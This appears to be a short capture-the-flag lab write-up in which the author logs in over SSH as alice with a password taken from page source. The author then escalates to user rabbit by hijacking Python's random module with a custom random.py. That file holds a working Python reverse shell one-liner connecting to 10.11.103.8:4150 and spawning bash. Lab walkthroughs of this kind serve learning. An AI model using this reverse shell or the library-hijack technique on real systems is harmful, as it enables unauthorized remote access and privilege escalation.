Using the gathered credentials from the page source
```bash
ssh alice@10.10.249.150
```

`alice:HowDothTheLittleCrocodileImproveHisShiningTail`

![[Pasted image 20240821162306.png]]
User `alice` can run the python code as user `rabbit` on the system

the python code imports `random`, made a custom `random.py` with a python reverse shell
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.103.8",4150));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
![[Pasted image 20240821162444.png]]

